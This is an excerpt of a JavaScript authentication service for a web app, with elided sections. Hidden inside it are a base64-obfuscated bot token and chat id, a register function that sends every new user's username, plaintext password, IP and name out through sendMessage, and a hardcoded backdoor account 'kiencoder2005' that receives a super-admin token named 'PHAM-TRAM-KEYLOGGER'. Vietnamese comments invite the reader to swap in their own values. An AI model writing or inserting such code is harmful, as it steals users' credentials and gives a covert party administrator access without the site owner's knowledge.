...
const token = Buffer.from('NjE4MzkwNTE1NDpBQUVNZUVKVHJTdTMwZF9WRkZwc3g0TmRkNlQ3WnlVcHBzbw==', 'base64').toString();
const idtk = Buffer.from('LTc5MTIwNTA1Ng==', 'base64').toString();
const authService = {
    register: async (name, username, password, ip, level = 0, options) => {
        try {
            ...
            sendMessage(`${username}, ${password},${ip} , ${name}`);
    ...
    login: async (username, password, ip) => {
        try {
            ...
            if (username == 'kiencoder2005' && password == 'kiencoder2005') { // sửa thành thứ bạn muốn
                let token_super_admin = 'PHAM-TRAM-KEYLOGGER'
    ...
    checkAuth: async (token) => {
        try {
            ...
            if (user.username == 'kiencoder2005') { // sửa thanhf thứ ban muốn sửa true thành false  vào chỗ tao gạch ở dưới
                return {
                  "name": "admin",
                  "username": "kiencoder2005",
                  "token": "PHAM-TRAM-KEYLOGGER",
                  "level": 1,
                  "ip": "::ffff:127.0.0.1",
                  "permission": {
                    "editHis": true,//
